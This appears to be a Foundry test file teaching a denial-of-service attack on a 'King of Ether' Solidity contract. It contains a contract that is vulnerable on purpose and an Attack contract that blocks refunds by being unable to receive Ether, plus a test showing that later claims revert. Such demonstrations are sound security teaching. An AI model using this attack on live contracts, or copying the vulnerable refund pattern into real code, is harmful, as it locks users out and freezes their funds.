// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract KingOfEther {
    address public king;
    uint256 public balance;

    function claimThrone() public payable {
        require(msg.value > balance, "You need to pay more ether to become the king");

        (bool success, ) = king.call{value: balance}("");
        require(success, "Failed to send Ether");

        king = msg.sender;
        balance = msg.value;
    }
}

contract Attack {
    KingOfEther public kingOfEther;

    constructor(address _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }

    // receive() external payable {}
}

contract TestKingOfEther is Test {
    KingOfEther public kingOfEther;
    Attack public attack;

    function setUp() public {
        kingOfEther = new KingOfEther();
        attack = new Attack(address(kingOfEther));
    }

    function testDOS() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);

        console.log("alice ", address(alice));
        console.log("bob ", address(bob));

        vm.deal(address(alice), 6 ether);
        vm.deal(address(bob), 4 ether);

        vm.startPrank(alice);
        kingOfEther.claimThrone{value: 1 ether}();

        console.log("king ", kingOfEther.king());
        console.log("balance ", kingOfEther.balance());

        console.log("alice balance", address(alice).balance);
        console.log("bob balance", address(bob).balance);

        vm.stopPrank();

        vm.startPrank(bob);
        kingOfEther.claimThrone{value: 2 ether}();
        console.log("king ", kingOfEther.king());
        console.log("balance ", kingOfEther.balance());

        console.log("alice balance", address(alice).balance);
        console.log("bob balance", address(bob).balance);
        vm.stopPrank();

        attack.attack{value: 3 ether}();

        console.log("Balance of KingOfEther contract", kingOfEther.balance());

        console.log("Attack completed, Alice claimthrone again, she will fail");

        vm.startPrank(alice);
        vm.expectRevert("Failed to send Ether");
        kingOfEther.claimThrone{value: 4 ether}();
        vm.stopPrank();

        console.log("alice balance", address(alice).balance);
        console.log("bob balance", address(bob).balance);

        console.log("Balance of KingOfEther contract", kingOfEther.balance());
    }

    receive() external payable {}
}